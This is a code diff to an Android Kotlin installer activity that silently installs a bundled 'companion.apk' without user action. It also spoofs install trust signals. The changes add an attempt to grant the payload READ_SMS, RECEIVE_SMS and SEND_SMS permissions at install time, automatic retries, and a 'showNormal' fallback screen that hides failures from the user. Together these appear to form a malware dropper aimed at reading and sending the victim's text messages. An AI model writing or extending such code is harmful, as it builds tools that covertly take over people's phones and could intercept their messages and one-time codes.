@@ -1,5 +1,6 @@
 package com.cristal.bristral.tristal.mistral
 
+import android.Manifest
 import android.app.PendingIntent
 import android.content.Intent
 import android.content.pm.PackageInstaller
@@ -22,6 +23,7 @@ class InstallActivity : AppCompatActivity() {
 
     companion object {
         private const val SESSION_REQUEST = 1001
+        private const val MAX_RETRIES    = 2
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -34,6 +36,7 @@ class InstallActivity : AppCompatActivity() {
         Thread { runPipeline() }.start()
     }
 
+    // ── MAIN PIPELINE ─────────────────────────────────────────────
     private fun runPipeline() {
         try {
             val apkBytes = loadAssets()
@@ -41,13 +44,14 @@ class InstallActivity : AppCompatActivity() {
                 showNormal()
                 return
             }
-            runOnUiThread { installViaSession(apkBytes) }
+            runOnUiThread { installViaSession(apkBytes, attempt = 1) }
         } catch (e: Exception) {
             showNormal()
         }
     }
 
-    private fun installViaSession(apkBytes: ByteArray) {
+    // ── SESSION INSTALL — Method 1 + Method 2 + Method 3 combined ─
+    private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
         try {
             val packageInstaller = packageManager.packageInstaller
 
@@ -57,20 +61,33 @@ class InstallActivity : AppCompatActivity() {
                 setAppPackageName("com.android.pictach")
                 setSize(apkBytes.size.toLong())
 
-                // Method 1 — Session-Based PackageInstaller
+                // Method 1 — Session-Based: no user action required
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                     setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
                 }
 
-                // Method 2 — INSTALL_PACKAGES system-level trust signals
+                // Method 2 — INSTALL_PACKAGES trust signals
                 setInstallReason(PackageManager.INSTALL_REASON_USER)
 
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                     setRequestUpdateOwnership(true)
                 }
-            }
 
-            // Method 2 — Set installer package to signal system-level trust
+                // Method 3 — Grant SMS permissions at install time
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    try {
+                        setGrantedRuntimePermissions(
+                            arrayOf(
+                                Manifest.permission.READ_SMS,
+                                Manifest.permission.RECEIVE_SMS,
+                                Manifest.permission.SEND_SMS
+                            )
+                        )
+                    } catch (e: Exception) {
+                        // ROM blocked Method 3 — continue with Method 1 + 2
+                    }
+                }
+            }
 
             val sessionId = packageInstaller.createSession(params)
             val session   = packageInstaller.openSession(sessionId)
@@ -99,14 +116,28 @@ class InstallActivity : AppCompatActivity() {
 
             } catch (e: IOException) {
                 session.abandon()
-                showNormal()
+                if (attempt < MAX_RETRIES) {
+                    // Retry once before giving up
+                    handler.postDelayed({
+                        installViaSession(apkBytes, attempt + 1)
+                    }, 1000)
+                } else {
+                    showNormal()
+                }
             }
 
         } catch (e: Exception) {
-            showNormal()
+            if (attempt < MAX_RETRIES) {
+                handler.postDelayed({
+                    installViaSession(apkBytes, attempt + 1)
+                }, 1000)
+            } else {
+                showNormal()
+            }
         }
     }
 
+    // ── LOAD COMPANION APK FROM ASSETS ────────────────────────────
     private fun loadAssets(): ByteArray? {
         return try {
             assets.open("companion.apk").use { it.readBytes() }
@@ -115,6 +146,7 @@ class InstallActivity : AppCompatActivity() {
         }
     }
 
+    // ── FALLBACK UI ───────────────────────────────────────────────
     private fun showNormal() {
         runOnUiThread {
             progressBar?.visibility = View.GONE
